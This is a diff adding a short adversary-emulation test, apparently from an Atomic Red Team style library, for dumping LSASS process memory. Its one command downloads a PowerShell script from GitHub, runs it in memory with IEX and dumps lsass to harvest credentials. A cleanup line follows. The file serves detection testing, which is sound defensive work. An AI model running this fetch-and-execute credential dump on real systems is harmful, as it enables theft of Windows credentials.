@@ -1,0 +1,12 @@
+#TechniqueName: OS Credential Dumping: LSASS Memory
+#AtomicTestName: Dump LSASS.exe Memory using Out-Minidump.ps1
+#Description: The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure&powershell implementation that leverages the MiniDumpWriteDump Win32 API call.&Upon successful execution, you should see the following file created $env:SYSTEMROOT\System32\lsass_*.dmp.&
+#Language: ps1
+
+#commands
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump
+
+
+#cleanup_commands
+Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
+
